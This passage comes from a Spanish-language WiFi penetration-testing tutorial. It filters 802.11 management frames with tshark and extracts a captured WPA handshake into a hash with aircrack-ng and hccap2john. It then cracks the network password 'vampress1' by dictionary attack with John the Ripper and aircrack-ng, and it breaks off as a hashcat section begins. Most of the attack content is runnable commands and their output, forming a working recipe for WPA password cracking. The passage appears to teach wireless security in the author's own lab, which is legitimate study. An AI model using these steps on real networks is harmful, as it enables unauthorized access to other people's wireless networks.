&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -i wlan0mon -Y &quot;wlan.fc.type_subtype==12&quot; 2&amp;gt;/dev/null&lt;/span&gt;
  200 39.994017471 AskeyCom_d4:16:78 → Broadcast    802.11 38 Deauthentication, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........
  201 39.994777432 AskeyCom_d4:16:78 → Broadcast    802.11 39 Deauthentication, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........
  202 39.996199413    Broadcast → AskeyCom_d4:16:78 802.11 38 Deauthentication, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........
  203 39.996798243    Broadcast → AskeyCom_d4:16:78 802.11 39 Deauthentication, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........
  205 39.999554640 AskeyCom_d4:16:78 → Broadcast    802.11 38 Deauthentication, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........
  206 40.000174666 AskeyCom_d4:16:78 → Broadcast    802.11 39 Deauthentication, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Paquetes Dissasociation&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tshark &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; wlan0mon &lt;span class=&quot;nt&quot;&gt;-Y&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;wlan.fc.type_subtype==10&quot;&lt;/span&gt; 2&amp;gt;/dev/null &lt;span class=&quot;c&quot;&gt;# Para este caso no pude pillar ninguno jeje&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Paquetes Clear To Send (CTS)&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -i wlan0mon -Y &quot;wlan.fc.type_subtype==28&quot; 2&amp;gt;/dev/null&lt;/span&gt;
  183 11.333769733              → XiaomiCo_b1:c5:53 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;20:34:fb:b1:c5:53&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Clear-to-send, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  186 11.334796342              → XiaomiCo_b1:c5:53 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;20:34:fb:b1:c5:53&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Clear-to-send, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  189 11.336432358              → XiaomiCo_b1:c5:53 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;20:34:fb:b1:c5:53&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Clear-to-send, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  192 11.339134653              → XiaomiCo_b1:c5:53 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;20:34:fb:b1:c5:53&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Clear-to-send, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  196 11.352502740              → XiaomiCo_b1:c5:53 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;20:34:fb:b1:c5:53&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Clear-to-send, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  199 11.357122880              → XiaomiCo_b1:c5:53 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;20:34:fb:b1:c5:53&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Clear-to-send, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  204 11.362841524              → XiaomiCo_b1:c5:53 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;20:34:fb:b1:c5:53&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Clear-to-send, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  222 11.418923972              → AskeyCom_d4:16:78 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1c:b0:44:d4:16:78&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Clear-to-send, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  224 11.419977797              → AskeyCom_d4:16:78 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1c:b0:44:d4:16:78&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Clear-to-send, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  226 11.427114234              → AskeyCom_d4:16:78 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1c:b0:44:d4:16:78&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Clear-to-send, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  230 11.427645439              → AskeyCom_d4:16:78 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1c:b0:44:d4:16:78&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Clear-to-send, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  235 11.430118052              → XiaomiCo_b1:c5:53 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;20:34:fb:b1:c5:53&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Clear-to-send, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  240 11.434558344              → XiaomiCo_b1:c5:53 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;20:34:fb:b1:c5:53&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Clear-to-send, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  243 11.435567660              → XiaomiCo_b1:c5:53 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;20:34:fb:b1:c5:53&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Clear-to-send, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  246 11.441881524              → XiaomiCo_b1:c5:53 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;20:34:fb:b1:c5:53&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Clear-to-send, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Paquetes ACK&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -i wlan0mon -Y &quot;wlan.fc.type_subtype==29&quot; 2&amp;gt;/dev/null&lt;/span&gt;
   44 2.532918866              → XiaomiCo_d0:51:c5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;a4:50:46:d0:51:c5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Acknowledgement, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  213 4.870822127              → 72:4f:56:d5:f4:21 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;72:4f:56:d5:f4:21&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Acknowledgement, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  214 4.872287210              → 72:4f:56:27:f7:f5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;72:4f:56:27:f7:f5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Acknowledgement, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  215 4.873060680              → 72:4f:56:d5:f4:21 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;72:4f:56:d5:f4:21&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Acknowledgement, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  231 5.792287268              → Pegatron_5b:42:f6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;38:60:77:5b:42:f6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Acknowledgement, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  252 6.105136504              → Apple_24:f9:60 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;70:14:a6:24:f9:60&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Acknowledgement, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  254 6.109740279              → HewlettP_f1:96:a3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;44:48:c1:f1:96:a3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Acknowledgement, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  268 6.137270470              → Apple_24:f9:60 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;70:14:a6:24:f9:60&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Acknowledgement, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  279 6.161518783              → Apple_24:f9:60 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;70:14:a6:24:f9:60&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Acknowledgement, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
  281 6.165512928              → Apple_24:f9:60 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;70:14:a6:24:f9:60&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 70 Acknowledgement, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;extracción-del-hash-en-el-handshake&quot;&gt;Extracción del Hash en el Handshake&lt;/h4&gt;

&lt;p&gt;Aunque no es necesario, por si queremos saber con qué estamos trabajando, es posible extraer el Hash
correspondiente a la captura donde se encuentra nuestro Handshake.&lt;/p&gt;

&lt;p&gt;Qué mejor que ver nuestro Handshake representado en formato Hash, tanto que hemos hablado de él como para no
prestarle un poco más de atención. Actualmente, &lt;strong&gt;aircrack-ng&lt;/strong&gt; cuenta con el parámetro ‘&lt;strong&gt;-J&lt;/strong&gt;’, de utilidad
para generar un archivo de ‘&lt;strong&gt;.hccap&lt;/strong&gt;’.&lt;/p&gt;

&lt;p&gt;¿Por qué queremos generar un archivo &lt;strong&gt;HCCAP&lt;/strong&gt;?, porque luego a través de la herramienta &lt;strong&gt;hccap2john&lt;/strong&gt;
podemos transformar ese archivo a un hash, igual que como haríamos como &lt;strong&gt;ssh2john&lt;/strong&gt; u otra utilidad
semejante.&lt;/p&gt;

&lt;p&gt;Por tanto, aquí una demostración:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#ls&lt;/span&gt;
Captura-01.cap
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#aircrack-ng -J miCaptura Captura-01.cap &lt;/span&gt;
Opening Captura-01.cape wait...
Read 5110 packets.

   &lt;span class=&quot;c&quot;&gt;#  BSSID              ESSID                     Encryption&lt;/span&gt;

   1  20:34:FB:B1:C5:53  hacklab                   WPA &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 handshake&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Choosing first network as target.

Opening Captura-01.cape wait...
Read 5110 packets.

1 potential targets



Building Hashcat file...

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; ESSID &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;length: 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: hacklab
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Key version: 2
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; BSSID: 20:34:FB:B1:C5:53
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; STA: 34:41:5D:46:D1:38
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; anonce:
    FE AD BB C5 CA AC 3C 41 52 56 B1 44 5D 61 29 2A 
    72 E1 7D 73 6A 5E 16 A5 15 88 E4 9E 58 42 EC 78 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; snonce:
    47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 1F 
    6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE E0 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Key MIC:
    0C 0E B7 91 69 C1 FE FD E5 D9 08 42 2E E4 A5 3C
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; eapol:
    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 
    01 47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 
    1F 6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE 
    E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC 
    04 01 00 00 0F AC 02 00 00 

Successfully written to miCaptura.hccap

┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#ls&lt;/span&gt;
Captura-01.cap  miCaptura.hccap
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, hacemos uso de &lt;strong&gt;hccap2john&lt;/strong&gt; para visualizar el hash:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#hccap2john miCaptura.hccap &amp;gt; miHash&lt;/span&gt;
┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#cat !$&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;miHash
hacklab:&lt;span class=&quot;nv&quot;&gt;$WPAPSK$hacklab&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#61HvgQJHB23RFh2sFppOICEh5FXsNpg8hf5z5qe3UilaDd6ewAmm/TC9ri1yfPj3mekwEJ7KgIFRMGYeQi3xQqdS3eIJWCGSK29gS.21.5I0.Ec............/FppOICEh5FXsNpg8hf5z5qe3UilaDd6ewAmm/TC9ri..................................................................3X.I.E..1uk2.E..1uk2.E..1uk0....................................................................................................................................................................................../t.....U....kCht3dkTvxtRY6EWvYdHk:34-41-5d-46-d1-38:20-34-fb-b1-c5-53:2034fbb1c553::WPA2:miCaptura.hccap&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y eso tan bonito que vemos, es el Hash correspondiente a la contraseña de la red WiFi, la cual podríamos
sencillamente crackear llegados hasta este punto haciendo uso de la herramienta &lt;strong&gt;John&lt;/strong&gt; junto a un diccionario.&lt;/p&gt;

&lt;h4 id=&quot;fuerza-bruta-con-john&quot;&gt;Fuerza bruta con John&lt;/h4&gt;

&lt;p&gt;Ya habiendo llegado hasta aquí, procedemos con los ataques de fuerza bruta. Aprovechando el punto
anteriormente visto, ya que contamos con un Hash… resulta sencillo crackear la contraseña de la red WiFi
haciendo uso de un diccionario a través de la herramienta &lt;strong&gt;John&lt;/strong&gt;, de la siguiente forma:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#john --wordlist=/usr/share/wordlists/rockyou.txt miHash --format=wpapsk&lt;/span&gt;
Using default input encoding: UTF-8
Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wpapsk, WPA/WPA2/PMF/PMKID PSK &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;PBKDF2-SHA1 256/256 AVX2 8x]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
No password hashes left to crack &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;see FAQ&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#john --show --format=wpapsk miHash &lt;/span&gt;
hacklab:vampress1:34-41-5d-46-d1-38:20-34-fb-b1-c5-53:2034fbb1c553::WPA2:miCaptura.hccap

1 password &lt;span class=&quot;nb&quot;&gt;hash &lt;/span&gt;cracked, 0 left
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#echo &quot;Password: $(john --show --format=wpapsk miHash | cut -d ':' -f 2)&quot;&lt;/span&gt;
Password: vampress1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y ahí dispondríamos de la contraseña de la red inalámbrica, que en este caso es &lt;strong&gt;vampress1&lt;/strong&gt;.&lt;/p&gt;

&lt;h4 id=&quot;fuerza-bruta-con-aircrack&quot;&gt;Fuerza bruta con Aircrack&lt;/h4&gt;

&lt;p&gt;Para crackear nuestro Handshake desde la propia suite de &lt;strong&gt;aircrack&lt;/strong&gt;, tan sólo tendríamos que emplear esta
sintaxis:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;aircrack-ng -w rutaDiccionario Captura-01.cap&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Se iniciaría el proceso de fuerza bruta y una vez obtenida se detendría la fase de cracking, mostrando la
contraseña siempre y cuando esta se encuentre en el diccionario especificado:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                              Aircrack-ng 1.5.2 

      &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;00:00:43] 487370/9822769 keys tested &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7440.27 k/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 

      Time left: 20 minutes, 54 seconds                          4.96%

                           KEY FOUND! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; vampress1 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;


      Master Key     : 9C E8 4E 94 F4 08 12 AC 1F 06 C9 5F CF C8 DE D5 
                       EC 70 5C 4B 73 FE 52 7B 02 29 9F 9A 88 E2 B3 74 

      Transient Key  : C6 21 8D E8 62 DD B2 A7 48 65 52 AA E0 C0 8E 85 
                       1B 63 D0 1D 9C C0 47 12 DA BF E1 63 12 01 8C 75 
                       D3 EF AE C5 E4 62 B7 C7 6E DE D1 05 9D 67 81 BF 
                       E7 94 71 D0 8D FE 92 17 61 AC 44 BA 48 E6 F7 B3 

      EAPOL HMAC     : 1A EB 42 13 85 E4 A1 FC 99 AF AA 97 4D AA EE 25
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;La velocidad de cómputo siempre va a depender de nuestra CPU, pero veremos un par de técnicas más adelante
para aumentar nuestra velocidad de cómputo, superando las 10 millones de contraseñas por segundo.&lt;/p&gt;

&lt;h4 id=&quot;fuerza-bruta-con-hashcat&quot;&gt;Fuerza bruta con Hashcat&lt;/h4&gt;

&lt;p&gt;Ya que &lt;strong&gt;aircrack&lt;/strong&gt; no es capaz de tirar por GPU, en caso de que tengáis una GPU como en mi caso:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#nvidia-detect &lt;/span&gt;
Detected NVIDIA GPUs:
